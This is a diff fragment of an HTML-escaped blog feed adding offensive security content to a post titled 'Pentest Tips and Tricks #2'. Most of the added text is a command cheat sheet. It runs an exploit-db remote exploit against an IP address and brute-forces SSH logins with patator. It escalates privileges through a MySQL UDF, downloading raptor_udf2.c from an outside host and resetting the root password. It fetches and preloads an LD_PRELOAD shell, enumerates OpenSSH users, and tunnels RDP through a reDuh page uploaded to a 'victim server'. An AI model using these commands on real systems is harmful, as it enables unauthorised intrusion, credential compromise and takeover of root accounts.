+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nikto-scan-with-squid-proxy&quot;&gt;Nikto scan with SQUID proxy&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nikto -useproxy http://squid_ip:3128 -h http://target_ip&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;hijack-a-binarys-full-path-in-bash-to-exec-your-own-code&quot;&gt;Hijack a binary’s full path in bash to exec your own code&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; /usr/bin/foo &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&amp;quot;It works&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; -f /usr/bin/foo
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/foo
+It works&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;local-privilege-escalation-through-mysql-run-with-root-privileges&quot;&gt;Local privilege escalation through MySQL run with root privileges&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 0xdeadbeef.info/exploits/raptor_udf2.c
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc -g -c raptor_udf2.c
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+mysql&amp;gt; use mysql&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; create table foo&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line blob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; insert into foo values&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;load_file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/home/user/raptor_udf2.so&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; * from foo into dumpfile &lt;span class=&quot;s1&quot;&gt;&amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; create &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; do_system returns integer soname &lt;span class=&quot;s1&quot;&gt;&amp;#39;raptor_udf2.so&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; * from mysql.func&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;echo &amp;quot;root:passwd&amp;quot; | chpasswd &amp;gt; /tmp/out; chown user:user /tmp/out&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+user:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
+Password:
+user:~# whoami
+root
+root:~# id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;bruteforce-ssh-login-with-patator&quot;&gt;Bruteforce SSH login with patator&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root:~# patator ssh_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.18 &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE1 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;word.txt &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;word.txt -x ignore:mesg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Authentication failed.&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;using-ldpreload-to-inject-features-to-programs&quot;&gt;Using LD_PRELOAD to inject features to programs&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://github.com/jivoi/pentest/ldpreload_shell.c
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo -u user &lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/ldpreload_shell.so /usr/local/bin/somesoft&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploit-the-openssh-user-enumeration-timing-attack&quot;&gt;Exploit the OpenSSH User Enumeration Timing Attack&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://github.com/c0r3dump3d/osueta&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./osueta.py -H 192.168.1.6 -p &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; -U root -d &lt;span class=&quot;m&quot;&gt;30&lt;/span&gt; -v yes
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./osueta.py -H 192.168.10.22 -p &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; -d &lt;span class=&quot;m&quot;&gt;15&lt;/span&gt; -v yes –dos no -L userfile.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;create-a-tcp-circuit-through-validly-formed-http-requests-with-reduh&quot;&gt;Create a TCP circuit through validly formed HTTP requests with ReDuh&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://github.com/sensepost/reDuh&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# step 1&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# upload reDuh.jsp to victim server&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;http://192.168.10.50/uploads/reDuh.jsp
+
+&lt;span class=&quot;c&quot;&gt;# step 2&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# run reDuhClient on attacker&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp
+
+&lt;span class=&quot;c&quot;&gt;# step 3&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# connecting to management port with nc&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc -nvv 127.0.0.1 1010
+
+&lt;span class=&quot;c&quot;&gt;# step 4&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# forward localport to remote port with tunnel&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;createTunnel&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 7777:172.16.0.4:3389
+
+&lt;span class=&quot;c&quot;&gt;# step 5&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# connect to localhost with rdp&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
   &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/&quot;&gt;Pentest Tips and Tricks #2&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on August 21, 2015.&lt;/p&gt;</content>
@@ -5085,6 +5338,7 @@ sudo docker load -i baseimage-nginx.img&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/header&gt;
 &lt;div id=&quot;drawer&quot;&gt;
 &lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#other-parts&quot; id=&quot;markdown-toc-other-parts&quot;&gt;Other Parts&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#nmap-full-web-vulnerable-scan&quot; id=&quot;markdown-toc-nmap-full-web-vulnerable-scan&quot;&gt;Nmap Full Web Vulnerable Scan&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#dirb-dir-bruteforce&quot; id=&quot;markdown-toc-dirb-dir-bruteforce&quot;&gt;Dirb Dir Bruteforce:&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#nikto-web-server-scanner&quot; id=&quot;markdown-toc-nikto-web-server-scanner&quot;&gt;Nikto web server scanner&lt;/a&gt;&lt;/li&gt;
@@ -5159,6 +5413,12 @@ sudo docker load -i baseimage-nginx.img&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
   &lt;/div&gt;
 &lt;/section&gt;
 &lt;!-- /#table-of-contents --&gt;
+
+&lt;h3 id=&quot;other-parts&quot;&gt;Other Parts&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/&quot;&gt;Part 1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/&quot;&gt;Part 2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;h3 id=&quot;nmap-full-web-vulnerable-scan&quot;&gt;Nmap Full Web Vulnerable Scan&lt;/h3&gt;
 
@@ -5791,6 +6051,7 @@ https://localhost:3790
 
 &lt;span class=&quot;c&quot;&gt;# use msfconsole&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/metasploit/app/msfconsole&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
   &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/&quot;&gt;Pentest Tips and Tricks&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on July 01, 2015.&lt;/p&gt;</content>
 </entry>
